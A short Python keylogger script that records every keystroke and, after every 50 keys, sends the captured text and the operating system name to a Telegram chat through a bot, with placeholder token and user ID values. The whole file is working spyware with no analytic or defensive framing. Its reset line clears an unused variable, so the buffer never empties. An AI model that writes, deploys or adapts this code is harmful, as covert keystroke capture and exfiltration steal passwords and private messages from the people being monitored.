import sys
from threading import Thread

import keyboard
from telegram import Bot


TOKEN = "TOKEN"
ID_USER = "USER_ID"
AFTER_WHICH_NUMBER_TO_SEND = 50

this_platform = sys.platform
bot = Bot(TOKEN)

number_of_clicks = 0
formed_symbols = ''

while True:
    key = keyboard.read_key()
    if keyboard.is_pressed(key):
        if key == 'enter':
            formed_symbols += '[ENTER]\n'
        elif key == 'space':
            formed_symbols += ' '
        elif len(key) < 2:
            formed_symbols += key
        else:
            formed_symbols += f'[{key}]'
        number_of_clicks += 1

    if number_of_clicks == AFTER_WHICH_NUMBER_TO_SEND:
        sent_text = f'[ os : {this_platform} ]\n\n{formed_symbols}'
        Thread(target=bot.send_message, args=(ID_USER, sent_text),).start()
        characters_to_send = ''
        number_of_clicks = 0
